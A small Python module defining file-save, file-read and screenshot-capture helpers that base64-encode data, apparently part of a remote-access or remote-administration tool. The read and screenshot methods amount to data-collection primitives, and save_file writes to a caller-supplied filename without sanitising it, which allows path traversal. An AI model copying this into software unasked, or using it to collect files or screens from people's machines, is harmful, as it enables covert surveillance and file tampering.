import os
import base64
import io 
import pyautogui


class FileTransfer:
    
    SAVE_DIRECTORY = "received_files"
    
    # File transfer
    
    @staticmethod
    def save_file(filename, encoded_content):
        
        os.makedirs(
            FileTransfer.SAVE_DIRECTORY, 
            exist_ok=True
        )
        
        file_path = os.path.join(
            FileTransfer.SAVE_DIRECTORY, 
            filename
        )
        
        with open(file_path, "wb") as file:
            file.write(
                base64.b64decode(
                    encoded_content
                    )
                )
            
        return file_path
    
    # File transfer - Read file for download
    
    @staticmethod
    def read_file(file_path):
        
        with open(file_path, "rb") as file:
            encoded_content = base64.b64encode(
                file.read()
                ).decode()
            
        return encoded_content
    
    # Screenshot capture
    
    @staticmethod
    def capture_screenshot():
        
        image = pyautogui.screenshot()
        
        buffer = io.BytesIO()
        
        image.save(
            buffer,
            format="PNG"
        )
        
        screenshot_data = base64.b64encode(
            buffer.getvalue()
        ).decode()  
        
        return screenshot_data  